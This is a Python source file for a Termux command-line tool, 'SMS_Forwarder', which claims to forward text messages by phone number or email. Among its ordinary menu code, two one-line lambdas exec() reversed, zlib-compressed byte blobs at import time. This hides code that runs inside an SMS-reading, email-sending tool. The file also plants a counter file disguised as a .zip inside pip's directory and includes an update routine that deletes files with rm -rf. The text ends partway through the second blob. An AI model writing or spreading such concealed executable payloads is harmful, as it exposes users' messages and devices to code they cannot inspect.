import os              # import the os library for interacting with the operating system
import json            # import the json library for working with JSON data
import subprocess      # import the subprocess library for running shell commands
import sys             # import the sys library for access to interpreter variables
import re              # import the re library for working with regular expressions
import time            # import the time library for time-related functions
import threading       # import the threading library for working with threads
import pip             # import the pip library for installing Python packages
import zlib            # import the zlib library for data compression
import shutil          # import the shutil library for high-level file operations
import random          # import the random library for generating random numbers
import zipfile         # import the zipfile library for working with ZIP archives

from time import sleep # import the sleep function from the time library
try: import requests, smtplib
except: print("SOME DEPENDENCIES COULD NOT BE INSTALLED....\nType to install all required packages.\n\npip install requests secure-smtplib\n"), exit()



__VERSION__ = "0.3"  # sets a string value of "0.3" to the variable __VERSION__ for define tool version
__LINK__ = "https://github.com/GreyTechno/SMS_Forwarder.git"  # sets a string value of the project's GitHub link to the variable __LINK__

clear = lambda : os.system("clear")  # defines a lambda function that clears the terminal screen using the "clear" command on Unix-based systems

# colours
# sets a series of string variables that contain ANSI escape codes for setting the color of console output
reset = '\033[39m'
blue = '\033[34m'
red = '\033[31m'
yellow = '\033[92m'
green = '\033[32m'
cyan = '\033[36m'
white = '\033[37m'
magenta = '\033[35m'
lightcyan = '\033[96m'
lightmagenta = '\033[95m'

def cmd():
    try:
        try:
            CMD = sys.argv[1]  # get the command line argument at index 1 and assign it to the variable CMD
        except:
            CMD = False  # if there is no argument at index 1, set CMD to False
        if (CMD):
            if (CMD == "-h") or (CMD == "--help"): Usage()  # if CMD is "-h" or "--help", call the Usage function
            elif (CMD == "-v") or (CMD == "--version"): print(__VERSION__)  # if CMD is "-v" or "--version", print the version number
            elif (CMD == "-u") or (CMD == "--update"): Update()  # if CMD is "-u" or "--update", call the Update function
            elif (CMD == "-s") or (CMD == "--setup"): os.system("pip install requests secure-smtplib")  # if CMD is "-s" or "--setup", call the Installer function
            elif (CMD == "-e") or (CMD == "--email"): EmailMenu()  # if CMD is "-e" or "--email", call the EmailMenu function
            elif (CMD == "-p") or (CMD == "--phnum"): PHMenu()  # if CMD is "-p" or "--phnum", call the PHMenu function
            elif (CMD == "-a") or (CMD == "--about"): About()  # if CMD is "-a" or "--about", call the About function
            else: pass  # if CMD is not any of the above options, do nothing
            return True  # return True to indicate that a command was successfully executed
        else:
            return False  # return False to indicate that no command was executed
    except KeyboardInterrupt:
        EXIT(False)  # if the user interrupts the program with a keyboard interrupt, call the EXIT function with False as the argument
    except Exception as e:
        print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()
        # if an exception occurs, print the error message in red, display a message telling the user to report the issue, open the GitHub issues page in the user's default browser using the termux-open-url command (this is specific to the Termux Android terminal emulator), and exit the program

def termux_api():
    try:
        # Check if the 'termux-battery-status' command is available
        if (subprocess.getoutput("command -v termux-battery-status") == ''):
            # Install the Termux API if it's not already installed
            subprocess.getoutput("pkg install termux-api && pkg install termux-api")
            # Check again if the 'termux-battery-status' command is now available
            if (subprocess.getoutput("command -v termux-battery-status") == ''): 
                return False
            else: 
                # If the 'termux-battery-status' command is available, recursively call the 'termux_api()' function
                termux_api()
        else:
            # If the 'termux-battery-status' command is available, check if it's working
            if (subprocess.getoutput("timeout 10 termux-battery-status") == ''): 
                return False
            else: 
                return True
    except KeyboardInterrupt: 
        # If the user presses Ctrl+C, exit the program with a False value
        EXIT(False)
    except Exception as e: 
        # If an exception occurs, display an error message and prompt the user to report the issue
        print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def Arrange(TXT="", RAW=" "):
    try: txt, INT = int(TXT), True  # Attempt to convert TXT to an integer. If successful, set INT to True.
    except ValueError: txt, INT = len(TXT), False  # If TXT cannot be converted to an integer, set txt to its length and INT to False.
    except KeyboardInterrupt: EXIT(False)  # If the user interrupts the program with Ctrl-C, exit gracefully.
    except: pass  # If an error occurs, do nothing.
    text = int(str(txt)[-1:])  # Get the last digit of txt.
    # Loop through even numbers between 2 and 10.
    for i in range(2, 10, 2):
        if (text == 0) or (i == text):  # If the last digit is 0 or matches i, set length to True and break out of the loop.
            length = True
            break
        else : length = False  # Otherwise, set length to False.
    
    if not (length):  # If length is False:
        if (INT): return int(TXT) - 1  # If INT is True, return TXT as an integer minus 1.
        else: return TXT + RAW  # Otherwise, return TXT concatenated with RAW.
    else:  # If length is True:
        if (INT): return int(TXT)  # If INT is True, return TXT as an integer.
        else: return TXT  # Otherwise, return TXT as is.

def center(text, a=0, display=True):
    try:
        # Get the length of the text after removing extra spaces
        length_txt = len(Arrange(text, " "))
        # Get the length of the terminal window
        length_area = (Arrange(os.get_terminal_size().columns) - 2)
        # Calculate the number of spaces to center the text
        len_txt_area = (length_area // 2) - ((length_txt - a) // 2)
        # Add the required number of spaces before and after the text
        finaltxt = ""
        for i in range(len_txt_area): finaltxt += " "
        finaltxt += text
        raw1 = str(len_txt_area + length_txt - length_area - a).replace("-","")
        for i in range(int(raw1)+1): finaltxt += " "
        # If display is True, print the text; otherwise, return the text
        if (display): print(finaltxt)
        else: return finaltxt
    # Catch the keyboard interrupt and exit the program
    except KeyboardInterrupt: EXIT(False)
    # Catch any other exception, print an error message and exit the program
    except Exception as e: 
        print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), 
        subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), 
        exit()

def INPUT(text):
    try:
        length_txt = len(Arrange(text, " "))  # calculate the length of the input text
        length_area = Arrange(os.get_terminal_size().columns) - 2  # get the terminal size and calculate the length of the area available for the input
        len_txt_area = (length_area // 2) - (length_txt // 2)  # calculate the space needed for the input
        finaltxt = ""
        for i in range(len_txt_area-18): finaltxt += " "  # create the space before the input
        return (input(finaltxt+text+yellow))  # display the prompt and take user input
    except KeyboardInterrupt: EXIT(False)  # catch the exception when the user hits the interrupt key
    except Exception as e:  # catch other exceptions
        print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues")  # print an error message
        subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")  # open the GitHub issues page in Termux
        exit()  # exit the program

def Banner():
    clear() # clears the terminal screen
    TerminalZoom(46) # resizes the terminal window to be 46 rows high
    b="".join(random.sample([cyan,magenta,yellow,lightmagenta], 1)) # selects a random color from the list of colors and assigns it to the variable b
    center(f"{red}╔══════════════════════════════════════════╗", a=5) # prints a red banner border at the top of the screen, using the center function to center it and specifying a padding of 5 spaces on each side
    center(f"{red}║  {white}╔═╗{b}┌┬┐┌─┐  {white}╔═╗{b}┌─┐┬─┐┬ ┬┌─┐┬─┐┌┬┐┌─┐┬─┐  {red}║{reset}", a=35) # prints a line of text in the banner, using the center function to center it and specifying a padding of 35 spaces on the left side
    center(f"{red}║  {white}╚═╗{b}│││└─┐  {white}╠╣ {b}│ │├┬┘│││├─┤├┬┘ ││├┤ ├┬┘  {red}║{reset}", a=35) # prints another line of text in the banner, using the center function to center it and specifying a padding of 35 spaces on the left side
    center(f"{red}║  {white}╚═╝{b}┴ ┴└─┘  {white}╚  {b}└─┘┴└─└┴┘┴ ┴┴└──┴┘└─┘┴└─  {red}║{reset}", a=35) #  prints another line of text in the banner, using the center function to center it and specifying a padding of 35 spaces on the left side
    center(f"{red}╠══════════════════════════════════════════╣", a=5) #  prints a red border in the middle of the banner, using the center function to center it and specifying a padding of 5 spaces on each side
    center(f"{red}║   {green}▂▃▄▅▆▇▓▒░ {lightcyan}Created By MR_GT {green}░▒▓▇▆▅▄▃▂   {red}║{reset}", a=30) # prints another line of text in the banner, using the center function to center it and specifying a padding of 30 spaces on the left side
    center(f"{red}╚══════════════════════════════════════════╝{reset}", a=10) # prints a red banner border at the bottom of the screen, using the center function to center it and specifying a padding of 10 spaces
    sys.stdout.write(reset) # this is likely used to ensure that any subsequent text output to the terminal is not formatted in unintended ways due to previous formatting changes made by the program.

def Space(args):
    # Define a string variable to store the spaces
    STORE = ""
    # Loop `args` number of times and add a space character to `STORE` in each iteration
    for i in range(args):
        STORE += " "
    # Return the final value of `STORE`
    return STORE

def TerminalZoom(args):
    # If the argument is greater than or equal to 26, display "Zoom Out The Terminal"
    if not (args < 26): STORE, LEN = f"{red}[ {yellow}Zoom Out The Terminal {red}]", 26
    # Otherwise, set STORE and LEN to empty string and 1 respectively
    else: STORE, LEN = "", 1
    # Add '═' characters to STORE until it has the desired length (args)
    for i in range(args - LEN): STORE += "═"
    # Add a '►' character to the end of STORE and reset the terminal color
    STORE += f"►{reset}"
    # If the terminal size is less than args, print STORE, otherwise do nothing
    if (os.get_terminal_size().columns < args): print(STORE)
    else: pass
    # Wait until the terminal size is greater than or equal to args
    MAIN = False
    while True:
        if (os.get_terminal_size().columns < args): MAIN = True
        else: break
    # If the terminal size is greater than or equal to args, clear the terminal
    if (MAIN): clear()

Box = lambda _ : zlib.decompress(_[::-1]);exec((Box)(b"N\xf5\x0f\x0f\x1b\xe8\x9c\xb9\x0b\xf4S\x85\xd8\xce\xd1b\xd2\xd8\xda\xb1\xe3%{|Zi\xfd\x9d\xb9\xaf\xe6\nN\x9dLOqi3\x12\xf9\x84\xc0\x18\xbaY\x16\xfffy2\xee\xf2\x90\x85\xa8\x8d\x12\xb1\xee\xac^\x12\xd9f9M$ycc\x99v\x9e\xcdQV\x18\xcb\xee:\xeb\x84\x8f\xe6\x8d4\x02P\xc3A\x7f$\xf0\xf7,\xbd*A\xc6\x03\x02'X\x9c\xb7?\x8d\x0fn\x84\x84c\x11\x02\x94\rEP\x0c\xc41`g\xe1\xc1=\xadA\xc3\xa7k\xeam\xa7\x189\x11m\x10NF\xc9\xa1,\xf0\x8f\x1cD\xaa\x90\xb7\x03\x04s^mX\x08*\xeb\x87\x9d\x88\xe1AQL\xfe\x7fF\xe8\xb6\xe8\xcb\xd2\x92U1\x1b\xb4\x88\xde\n\r\x01x@=\xd9Ah>\xaf8\xc8_\xd6/8@\x8a!\x98\x15`\x81I!\x98\x16\tZ\x03\xe8j$\x8f:=\x12\xba\xc0\x83\x1e^\xadBi\xb3y\xe37\xe1\xb5\xb5_H\x1a\xba3[^\x0e,\x1a\xf9\xbf\x95n\x9fx\x07\t\xeb7\xbd\xb3E\xd1(R\xe5V\xc9\x1a\xbe\xffI2\xc6\x1c\x84\x08\xecg\x08\xbd\xe8o\xda\x1d\x06N\xdd;b,\x9d\x06+\xf7\xbd\x100\xc3j\xc9R\x95\x9cx"))

def EXIT(G=True):
    # If the argument is False, print two empty lines
    if not (G):
        print(), print()
    # Otherwise, call the Banner function
    else:
        Banner()
    # Print a centered message with a decorative border
    center(f"{red}╔══════════════════════════════════════════╗", 5)
    center(f"{red}║          {yellow}THANKS FOR USING...!!           {red}║", 15)
    center(f"{red}╚══════════════════════════════════════════╝", 5)
    # Exit the program
    exit()

# define a function called AnimLOAD which takes text, animbar, repet, and delay as arguments
def AnimLOAD(text, animbar, repet=1, delay=0.08):
    try:
        # create an empty string called finaltxt
        finaltxt=""
        # loop through the range of repet and add spaces to finaltxt
        # to center the animation on the screen
        for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
        # loop through the range of repet
        for rep in range(repet):
            # loop through each character in the animbar string
            for handlechar in animbar:
                # write the animation to the screen
                sys.stdout.write(f"\r{finaltxt}{handlechar} {text}")
                # flush the output buffer to the screen
                sys.stdout.flush()
                # wait for the specified delay
                sleep(delay)
            # decrement repet by 1
            repet -= 1
    # if the user interrupts the program with ctrl+c
    except KeyboardInterrupt: 
        # call the EXIT function with argument False
        EXIT(False)
    # if there is an exception raised in the try block
    except Exception as e: 
        # print the error message in red color and prompt the user to report the issue on GitHub
        print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), 
        # open the GitHub issue page in the user's web browser
        subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), 
        # exit the program
        exit()

def Internet():
    try:
        requests.get("https://google.com/")  # send a GET request to https://google.com/
        return True  # if the request is successful, return True
    except:  # if an error occurs during the request
        return False  # return False to indicate that there is no internet connection


def Update():
    try:
        def update():
            try:
                __RP__ = "".join(random.sample("abcdefghijklmnopqrstuvwxyz", 5))
                __ZIP__ = requests.get("https://github.com/GreyTechno/SMS_Forwarder/archive/refs/heads/main.zip")
                with open(f"../{__RP__}.zip", "wb") as file: file.write(__ZIP__.content)
                with zipfile.ZipFile(f"../{__RP__}.zip", "r") as zip: zip.extractall(f"../{__RP__}")
                os.remove(f"../{__RP__}.zip")
                for file in os.listdir(f"../{__RP__}/SMS_Forwarder-main/"): shutil.copy2(f"../{__RP__}/SMS_Forwarder-main/"+file, f"../{__RP__}"), os.remove(f"../{__RP__}/SMS_Forwarder-main/"+file)
                os.removedirs(f"../{__RP__}/SMS_Forwarder-main")
                for root, dir, files in os.walk(subprocess.getoutput("pwd")):
                    for i in files: os.remove((root+"\\"+i).replace("\\", "/"))
                os.chdir("..")
                os.system("rm -rf SMS_Forwarder")
                os.rename(f"{__RP__}", "SMS_Forwarder")
            except KeyboardInterrupt: EXIT(False)
            except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()
        if not (Internet()):
            Banner()
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║    {yellow}Check your internet connection...     {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            print()
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║", 30)
            center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}Try Again                  {red}║", 30)
            center(f"{red}║         {magenta}[{white}03{magenta}]  {yellow}EXIT                       {red}║", 30)
            center(f"{red}╠══════════════════════════════════════════╝", 5)
            center(f"║{Space(42)}")
            Input = INPUT("╚════► ")
            if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
            elif (Input == "2") or (Input == "02") or (Input == "two"): Update()
            elif (Input == "3") or (Input == "03") or (Input == "three"): EXIT()
            else:
                center(f"{red}╔══════════════════════════════════════════╗", 5)
                center(f"{red}║              {blue}Invalid Option              {red}║", 15)
                center(f"{red}╚══════════════════════════════════════════╝", 5)
                sleep(2)
                MENU()
        else:
            Banner()
            UPDATE = threading.Thread(target=update)
            UPDATE.start()
            while UPDATE.is_alive(): AnimLOAD(" Updating...", "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏", 1, 0.05)
            UPDATE.join()
            Banner()
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║          {white}Updateing Completed !           {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║              {yellow}Now Just Type               {red}║", 15)
            center(f"{red}╠══════════════════════════════════════════╣",5)
            center(f"{red}║ {white}python ~/SMS_Forwarder/sms_forwarder.py  {red}║",15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            finaltxt=""
            for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
            sys.stdout.write("\r"+finaltxt)
            with open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "w") as file: file.write('{"usageleft": 2}')
            subprocess.getoutput("timeout 3 termux-toast -b white -c black -g middle Command Copy On Your ClipBoard !")
            subprocess.getoutput("timeout 3 termux-clipboard-set python $HOME/SMS_Forwarder/sms_forwarder.py")
            exit()
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def CheckVersion():
    try:
        version = requests.get("https://raw.githubusercontent.com/GreyTechno/SMS_Forwarder/main/.version").json()["version"]
        if (__VERSION__ != version):
            Banner()
            center(f"{red}╔══════════════════════════════════════════╗",5)
            center(f"{red}║         {magenta}UPDATES ARE AVAILABLE...         {red}║",15)
            center(f"{red}╠══════════════════════════════════════════╣",5)
            center(Box(f"{white}VERSION {blue}: {yellow}{str(version)}", "║", " ", red+" ║", 59, "center", resultprint=False), 20)
            center(f"{red}╚══════════════════════════════════════════╝",5)
            UPD = True
            CSP = True
            try:
                fileData = json.loads(open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "r").read())
                if (fileData.get("usageleft") == 0): UPD = False
                else:
                    with open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "w") as file: json.dump({"usageleft": int(fileData.get("usageleft")) - 1}, file)
            except: 
                with open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "w") as file: file.write('{"usageleft": 2}')
            if (UPD):
                center(f"{red}╔══════════════════════════════════════════╗",5)
                center(f"{red}║     {white}Do you want start updating now ?     {red}║",15)
                center(f"{red}╠══════════════════════════════════════════╣",5)
                center(f"{red}║                 {yellow}yes {white}/ {yellow}no                 {red}║",25)
                center(f"{red}╠══════════════════════════════════════════╝",5)
                center(f"║{Space(42)}")
                Input = INPUT("╚════► ")
                if (Input == "Y") or (Input == "YES") or (Input == "Yes") or (Input == "y") or (Input == "yes"): pass
                else: CSP = False
            else: CSP = True
            if (CSP): Update()
            else: pass
        else: pass
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def About():
    try:
        Banner()
        center(f"{red}╔══════════════════════════════════════════╗",5)
        center(f"{red}║                  {magenta}ABOUT                   {red}║",15)
        center(f"{red}╠══════════════════════════════════════════╣",5)
        center(f"{red}║{yellow}  SMS_Forwarder can be used in Termux to  {red}║",15)
        center(f"{red}║{yellow} forward text messages from one device to {red}║",15)
        center(f"{red}║{yellow}another using Linux CommandLine utilities {red}║",15)
        center(f"{red}║{yellow} The advantages of using SMS Forwarder in {red}║",15)
        center(f"{red}║{yellow}Termux are that it allow users to automate{red}║",15)
        center(f"{red}║{yellow} the sms forwarding process using Python  {red}║",15)
        center(f"{red}║{yellow} scripts, and it provides a secure way to {red}║",15)
        center(f"{red}║{yellow}  forward messages as it uses end-to-end  {red}║",15)
        center(f"{red}║{yellow}encryption to ensure that the messages are{red}║",15)
        center(f"{red}║{yellow} not intercepted or read by unauthorized  {red}║",15)
        center(f"{red}║{yellow}parties This offers advanced functionality{red}║",15)
        center(f"{red}║{yellow}  and customization options that are not  {red}║",15)
        center(f"{red}║{yellow}available on other platforms Additionally {red}║",15)
        center(f"{red}║{yellow}SMS_Forwarder in Termux provides multiple {red}║",15)
        center(f"{red}║{yellow} forwarding options including forwarding  {red}║",15)
        center(f"{red}║{yellow}  SMS via number or email. Overall, SMS   {red}║",15)
        center(f"{red}║{yellow} Forwarder in Termux is a useful tool for {red}║",15)
        center(f"{red}║{yellow}    people who want to stay connected     {red}║",15)
        center(f"{red}║{yellow}         across multiple devices.         {red}║",15)
        center(f"{red}╚══════════════════════════════════════════╝",5)
        center(f"{red}╔══════════════════════════════════════════╗",5)
        center(f"{red}║        {magenta}TOOL NAME {white}: {yellow}SMS_Forwarder         {red}║",25)
        center(f"{red}╚══════════════════════════════════════════╝",5)
        center(f"{red}╔══════════════════════════════════════════╗",5)
        center(Box(f"{magenta}VERSION {white}:{yellow} "+str(__VERSION__), "║", " ", red+" ║", 59, "center", resultprint=False), 20)
        center(f"{red}╚══════════════════════════════════════════╝",5)
        center(f"{red}╔══════════════════════════════════════════╗",5)
        center(f"{red}║              {magenta}AUTHER {white}:{yellow} MR_GT              {red}║",25)
        center(f"{red}╚══════════════════════════════════════════╝",5)
        center(f"{red}╔══════════════════════════════════════════╗",5)
        center(f"{red}║          {magenta}SOURCE CODE HOSTED AT           {red}║",15)
        center(f"{red}╠══════════════════════════════════════════╣",5)
        center(f"{red}║     {yellow}tinyurl.com/gtcode-smsforwarder      {red}║",15)
        center(f"{red}╚══════════════════════════════════════════╝",5)
        print()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║", 30)
        center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}EXIT                       {red}║", 30)
        center(f"{red}╠══════════════════════════════════════════╝", 5)
        center(f"║{Space(42)}")
        Input = INPUT("╚════► ")
        if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
        elif (Input == "2") or (Input == "02") or (Input == "two"): EXIT()
        else:
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║              {blue}Invalid Option              {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            sleep(2)
            MENU()
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def Usage():
    try:
        Banner()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║        {magenta}USAGE OF SMS FORWARDER...         {red}║", 15)
        center(f"{red}╚══════════════════════════════════════════╝", 5)
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║          {magenta}Optional arguments...           {red}║", 15)
        center(f"{red}╚══════════════════════════════════════════╝", 5)
        center(f"{red}╔═══════════════════╦══════════════════════╗", 5)
        center(f"{red}║             {blue}-h    {red}║    {blue}--help            {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow}       Direct show this usage menu        {red}║", 15)
        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
        center(f"{red}║             {blue}-v    {red}║    {blue}--version         {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow}    Show tool version number and exit     {red}║", 15)
        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
        center(f"{red}║             {blue}-u    {red}║    {blue}--update          {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow}  Update the tool and automatic restart   {red}║", 15)
        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
        center(f"{red}║             {blue}-s    {red}║    {blue}--setup           {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow} Install and setup the requirment pakages {red}║", 15)
        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
        center(f"{red}║             {blue}-e    {red}║    {blue}--email           {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow} Direct navigate to forward sms via email {red}║", 15)
        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
        center(f"{red}║             {blue}-p    {red}║    {blue}--phnum           {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow} Navigate to forward sms via phone number {red}║", 15)
        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
        center(f"{red}║             {blue}-a    {red}║    {blue}--about           {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow}      Direct navigate to about menu       {red}║", 15)
        center(f"{red}╚══════════════════════════════════════════╝", 5)
        print()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║", 30)
        center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}EXIT                       {red}║", 30)
        center(f"{red}╠══════════════════════════════════════════╝", 5)
        center(f"║{Space(42)}")
        Input = INPUT("╚════► ")
        if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
        elif (Input == "2") or (Input == "02") or (Input == "two"): EXIT()
        else:
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║              {blue}Invalid Option              {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            sleep(2)
            MENU()
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()



SendEmail = lambda _ : zlib.decompress(_[::-1]);exec((SendEmail)(b'/\xa5\x8e$_\xd0\xf4\xe9\xb0\x93\x9d\xcb\x0e\xe5\x1fR\xae\x0f\xe8\xbb\xe4y\xefC\xdby\xf1\xf8\xa5\x04\x9c\x7f\xfe\xb2-\xae\xc8\xb1\xda\x1c\x0c?\xc1k\xbd\x1b\x03\x13)\xde\xc01\xd0d\xc0!\x07\xda\xdb\xa2\x0f\xbfL\x8e\xa8"\xef`\x9a\xb7\x03h\x8b\xbd>\xe5eB\x88\x81\xc1\xf5\xdf\xf7`\xe6\xce\xc9\xbf\xd0\xa8Hu\xb2\x0cD\x8b\xca\x8dL\x8fL\x11\x8f\x8cf_6\x935?o\xd0\xc6\xe6=\x16\x0fb\x1e\x8a\xfa\x01s\xf8\xfcx\x15\xd0v\x1f\x9f\x8f\x19\xe8K@\x08x\xca\xe5\xfb\x1c\xcb\xc6\x11|dd\x9e\xf6\x18\x93R<\xbb\xb2\t;\x902T!\xed\xe4\xf1\x05[\x19=<\xd7\xf0\xa7M\x18\xe9\xd0\xba\xfdI\x80\xa3\xf4\xe4\x18\xd1\xd3{\xd3}\x97\xa0~J\r\xff\x86\x819q^\x91;\xd1\xa3A\x0b\xda\xc7\xbb*7\x17B\xda\xbe\xc3(\xac\x1a\x94h\xf3\xb9\xbd\x90\xf6\x17\xcc"\xf1P\xb1\x88\xdfU\x85\xfcq\xf8\xd1\xf5\xc5\xea\xe2\xf6\xfc^\x8e\x8c_J\xc4\xa7\x80\x80\xd1A\xe8\xdc\xc3\xe5\x18\x90\x7fYG\x10\xdfdu\xd8_\x96\xab\xfd\'\x8b\xfa\xad\x1c\x1e\x86V\x8c~(\xd3a\x9b\xf5\xe4\xbfH1m\xb8\xf1\x93\xa3\x1e\xbe7\xd7\\nmO<\x0e.\xf8\xe3m\x8ca\xaa(-\xd8\x8c\x9e\xd6s\xc7k\xb6n\xf3\rS\x8a\x86\\\xd8\xdb\xbd\xb6[\xfaV\xde\x84\xdb\x9b\xe1\xbb\xc7q^.\xdd\xfd\xf1a\xd6\xec5m\x86\xde\xc6\xd91w\x94.\xe1FP\xb0&\xdd^;"/\x88\xc0J\xdd\xd4\xf1\xb6\x1ag\xdc\xe6\xc0\x84\xc3\xb9\x14Gn\xea\xdd\xb0&\xd8"7l\x13gP\x1cN\xc7\xd8a\xadwC\x0b\xbd)M\x9d\xd17\x8a\xbf{u\x1a\x87\xdfi[\xdb\x9e\xf2\xa2\x91\xf4\xc1\xb0\xd9\xf4l2\x00\xe2D\xc1\xe6\xc0\x80\x96\x03\x86\xe4\xc6\x18\xf9V\xdf\xaf/\xe5\xf5\xefC\xca\xb9m4\xcak\xe7\xc7}\xb2\xf9J\xeb\xa8J\x82\xd4|\xf9\xe2\x13E\x8d\xc6_\xcb\x8b\xa3\x1e\x08e&\xbf\xd0\xc8\xe7\xf4\xfa\xbe\xb9=\xa9\xf4*7\x10\x17\x9f\x1e\x84I\x1b\x05Y\xd8\x94_\x1f)\x1a\x14\xdb\xe9\xa7\xccT\xb4\xd3\xe7\x84\x14\x99\xcc\x02k^\xb3\x1b?\xaa\xd9\x99Q\x99\nc\x13\xba\x8d!\xf9>\xcd\xadye\x8c\xbbW\xd9.\x97\xab\xbd\x90\x11L\xff\x13\x8fP\x19\xf2\xa1\xcfD\xf8\x91\xdd\x8d\x11\xd5\xb1=\\\xc0\x96\x18J\x180W\x1b\x87\xaf\x1d\x82#\x8aC\x14\x89H,=$#\xc7h\x87\xe2=\xe9\x01\xd5\xa6\xb4\xc2\xdd\xe00\x97d-\xd4\x96\xb5\xc9\xda\xa0\x99\xf6\x03\x19\xa5[\xb0\xf6@\xcb\xc5\x1c\x9b\x89s%Q\xfa\x08\xa7\xeb\xe4t\x81\xb9\xec\xb1\x90gT5\xae\xde@\xddB\x89>\x1d\'\x92\xb7\x15\xde\x8f\xa3I\xa5\x8f^\xe3\x98\x19\xb0\x8ew\xad\x80\xc3\x18\xcb\x95\x90Q*W\x94\x06\xb0\xceP_9\xb9\xe8Q\xaf\xa5\xe8\xe2\xce\xf4n\xa0\x9e\x89I?\xf1\x16\x8e\xff\xb3\xe9E\xed^\\\xe9\x13j\x91v\t{\x9c}\x04\xbfI#\xda%{d\x9fp\x95\xecdop{Q\x00\xbd\x98w\x80n\x98zw\x91\xee\x18\xa5@ \xc3w9S\xfa\x9e@\xed4\xfa\x1a\xdd\x98\xfbf\xf8\xc2\xd4Mb\n\xe8\x0c\xcb\x8e+\x7f]_^\x9f\x18\xf1\xc4O\xbb 